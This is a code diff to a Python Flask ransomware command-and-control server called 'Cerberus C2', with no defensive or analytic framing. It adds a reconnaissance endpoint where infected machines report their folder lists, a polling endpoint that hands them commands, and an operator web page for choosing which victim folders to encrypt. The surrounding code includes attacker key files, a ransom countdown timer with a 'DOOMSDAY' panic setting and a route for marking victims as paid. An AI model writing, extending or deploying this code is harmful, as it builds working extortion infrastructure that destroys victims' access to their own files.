@@ -19,6 +19,10 @@ C2_PORT = 5000
 # Structure: {victim_id: {status: str, encrypted_key: str, decrypted_key: str, first_seen: str, timer: int}}
 victims = {}
 
+# Store pending victims waiting for target selection
+# Structure: {'VICTIM_ID': {'files': ['/path/A', '/path/B'], 'command_queue': None, 'last_seen': str}}
+recon_data = {}
+
 # --- Cryptography Setup ---
 PRIVATE_KEY_FILE = "attacker_private_key.pem"
 PUBLIC_KEY_FILE = "attacker_public_key.pem"
@@ -145,9 +149,29 @@ def home():
     html += """
                 </tbody>
             </table>
+    """
+    
+    # Add PROMINENT notification if victims are waiting for target selection
+    if recon_data:
+        html += f"""
+            <div style="background: linear-gradient(90deg, #ff6600, #ff3300); padding: 15px; margin: 20px 0; border-radius: 8px; animation: pulse 1.5s infinite;">
+                <style>@keyframes pulse {{ 0%, 100% {{ opacity: 1; }} 50% {{ opacity: 0.7; }} }}</style>
+                <h2 style="margin: 0; color: white; text-align: center;">
+                    ⚠️ {len(recon_data)} VICTIM(S) WAITING FOR TARGET SELECTION ⚠️
+                </h2>
+                <p style="margin: 10px 0 0 0; text-align: center; color: white;">
+                    <a href="/target_selection" style="color: #ffff00; font-size: 18px; font-weight: bold;">
+                        👉 CLICK HERE TO SELECT FOLDERS TO ENCRYPT 👈
+                    </a>
+                </p>
+            </div>
+        """
+    
+    html += """
             <div style="text-align: center; margin-top: 20px; color: #555;">
                 <p>Server Online | Listening on Port 5000</p>
                 <p>Use 'DOOMSDAY' to set timer to 1 minute instant panic.</p>
+                <p><a href="/target_selection" style="color: #ff6600; font-weight: bold;">[🎯 TARGET SELECTION - SELECT FOLDERS TO ENCRYPT]</a></p>
                 <p><a href="/qr" target="_blank" style="color: #00ff00; font-weight: bold;">[GENERATE MOBILE QR CODE]</a></p>
             </div>
         </div>
@@ -373,6 +397,217 @@ def update_timer(victim_id, action):
     # Queue this update to be sent to the victim on next heartbeat
     victims[victim_id]['pending_timer_update'] = new_time
     return redirect(url_for('home'))
+
+# --- TARGET SELECTION FEATURE ---
+@app.route('/api/recon', methods=['POST'])
+def receive_recon():
+    """Victim sends their folder list. We store it and wait for attacker to select."""
+    data = request.json
+    vid = data.get('id')
+    files = data.get('files', [])
+    
+    recon_data[vid] = {
+        'files': files,
+        'command_queue': None,  # Waiting for attacker input
+        'last_seen': datetime.datetime.now().strftime("%H:%M:%S")
+    }
+    print(f"[+] Victim {vid} is online and waiting for folder selection. {len(files)} folders found.")
+    return "OK", 200
+
+@app.route('/api/task/<vid>', methods=['GET'])
+def serve_task(vid):
+    """Victim polls this to see if attacker selected folders yet."""
+    if vid in recon_data and recon_data[vid]['command_queue']:
+        # Send the command and clear recon data
+        command = recon_data[vid]['command_queue']
+        del recon_data[vid]
+        return jsonify(command)
+    return jsonify({"action": "WAIT"})
+
+@app.route('/target_selection')
+def target_ui():
+    """Attacker UI to see waiting victims and select their folders to encrypt."""
+    html = """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Target Selection - Cerberus C2</title>
+        <!-- NO AUTO-REFRESH - Manual refresh button instead -->
+        <style>
+            body { background: #0d0d0d; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, sans-serif; padding: 20px; margin: 0; }
+            h1 { color: #ff3333; text-align: center; text-shadow: 0 0 10px #ff0000; margin-bottom: 10px; }
+            .subtitle { text-align: center; color: #888; margin-bottom: 20px; }
+            .nav-bar { text-align: center; margin-bottom: 20px; }
+            .nav-bar a { color: #00ff00; margin: 0 15px; text-decoration: none; }
+            .nav-bar a:hover { text-decoration: underline; }
+            .btn-refresh { background: #007bff; color: white; padding: 8px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+            .btn-refresh:hover { background: #0056b3; }
+            
+            .victim-card { 
+                background: linear-gradient(135deg, #1a1a1a, #252525); 
+                border: 2px solid #ff6600; 
+                padding: 20px; 
+                margin: 15px auto; 
+                border-radius: 10px; 
+                max-width: 900px;
+                box-shadow: 0 0 20px rgba(255, 102, 0, 0.3);
+            }
+            .victim-header { 
+                display: flex; 
+                justify-content: space-between; 
+                align-items: center; 
+                margin-bottom: 15px;
+                padding-bottom: 10px;
+                border-bottom: 1px solid #444;
+            }
+            .victim-id { color: #ff6600; font-size: 20px; font-weight: bold; }
+            .victim-status { color: #00ff00; font-size: 14px; }
+            
+            .folder-section { 
+                background: #111; 
+                border-radius: 8px; 
+                padding: 15px; 
+                margin: 10px 0;
+                max-height: 400px;
+                overflow-y: auto;
+            }
+            .folder-section::-webkit-scrollbar { width: 8px; }
+            .folder-section::-webkit-scrollbar-track { background: #222; }
+            .folder-section::-webkit-scrollbar-thumb { background: #ff6600; border-radius: 4px; }
+            
+            .folder-item { 
+                padding: 8px 12px; 
+                margin: 4px 0;
+                border-radius: 5px;
+                display: flex;
+                align-items: center;
+                cursor: pointer;
+                transition: background 0.2s;
+            }
+            .folder-item:hover { background: #333; }
+            .folder-item input { margin-right: 10px; transform: scale(1.3); }
+            .folder-item label { cursor: pointer; flex: 1; }
+            .folder-icon { margin-right: 8px; }
+            
+            .select-controls { margin: 15px 0; text-align: center; }
+            .select-controls button { 
+                background: #444; 
+                color: white; 
+                border: none; 
+                padding: 8px 15px; 
+                margin: 0 5px; 
+                border-radius: 4px; 
+                cursor: pointer;
+            }
+            .select-controls button:hover { background: #555; }
+            
+            .btn-encrypt { 
+                background: linear-gradient(90deg, #dc3545, #ff0000); 
+                color: white; 
+                padding: 15px 50px; 
+                border: none; 
+                cursor: pointer; 
+                font-weight: bold; 
+                font-size: 18px; 
+                border-radius: 8px;
+                display: block;
+                margin: 20px auto 0;
+                transition: all 0.3s;
+            }
+            .btn-encrypt:hover { 
+                transform: scale(1.05);
+                box-shadow: 0 0 25px #ff0000; 
+            }
+            
+            .no-victims { 
+                text-align: center; 
+                color: #666; 
+                padding: 50px; 
+                font-size: 18px;
+            }
+            .no-victims .icon { font-size: 50px; margin-bottom: 15px; }
+            
+            .tip { background: #1a3a1a; border: 1px solid #00ff00; padding: 10px 15px; border-radius: 5px; margin: 15px auto; max-width: 600px; text-align: center; color: #00ff00; }
+        </style>
+        <script>
+            function selectAll(formId) {
+                document.querySelectorAll('#' + formId + ' input[type=checkbox]').forEach(cb => cb.checked = true);
+            }
+            function selectNone(formId) {
+                document.querySelectorAll('#' + formId + ' input[type=checkbox]').forEach(cb => cb.checked = false);
+            }
+        </script>
+    </head>
+    <body>
+        <h1>🎯 Target Selection</h1>
+        <p class="subtitle">Select folders to encrypt on victim machines</p>
+        
+        <div class="nav-bar">
+            <a href="/">← Back to Dashboard</a>
+            <button class="btn-refresh" onclick="location.reload()">🔄 Refresh</button>
+        </div>
+        
+        <div class="tip">💡 TIP: This page does NOT auto-refresh. Click "Refresh" button to check for new victims.</div>
+    """
+    
+    if not recon_data:
+        html += """
+        <div class="no-victims">
+            <div class="icon">📭</div>
+            <p>No victims waiting for target selection...</p>
+            <p style="color:#444;">Run the installer on a victim machine to see them here.</p>
+        </div>
+        """
+    
+    for idx, (vid, data) in enumerate(recon_data.items()):
+        form_id = f"form_{idx}"
+        folder_count = len(data['files'])
+        html += f"""
+        <div class="victim-card">
+            <div class="victim-header">
+                <div class="victim-id">🖥️ VICTIM: {vid}</div>
+                <div class="victim-status">● Online | Last Seen: {data['last_seen']} | {folder_count} folders found</div>
+            </div>
+            <form id="{form_id}" action="/send_command/{vid}" method="POST">
+                <div class="select-controls">
+                    <button type="button" onclick="selectAll('{form_id}')">✅ Select All</button>
+                    <button type="button" onclick="selectNone('{form_id}')">❌ Deselect All</button>
+                </div>
+                <div class="folder-section">
+        """
+        for folder in sorted(data['files']):
+            # Extract just the folder name for display
+            folder_name = folder.split('\\')[-1] if '\\' in folder else folder.split('/')[-1]
+            html += f'''
+                    <div class="folder-item">
+                        <input type="checkbox" name="targets" value="{folder}" id="cb_{hash(folder)}">
+                        <span class="folder-icon">📁</span>
+                        <label for="cb_{hash(folder)}">{folder}</label>
+                    </div>
+            '''
+        
+        html += """
+                </div>
+                <button type="submit" class="btn-encrypt">🔐 ENCRYPT SELECTED FOLDERS</button>
+            </form>
+        </div>
+        """
+    
+    html += "</body></html>"
+    return html
+
+@app.route('/send_command/<vid>', methods=['POST'])
+def send_command(vid):
+    """Takes selected folders and queues the encrypt command."""
+    targets = request.form.getlist('targets')
+    if vid in recon_data:
+        recon_data[vid]['command_queue'] = {
+            "action": "ENCRYPT",
+            "targets": targets
+        }
+        print(f"[!] ENCRYPT command queued for {vid} - {len(targets)} folders selected")
+        return redirect(url_for('target_ui'))
+    return "Victim not found", 404
 
 @app.route('/mark_paid/<victim_id>', methods=['POST', 'GET'])
 def mark_as_paid(victim_id):
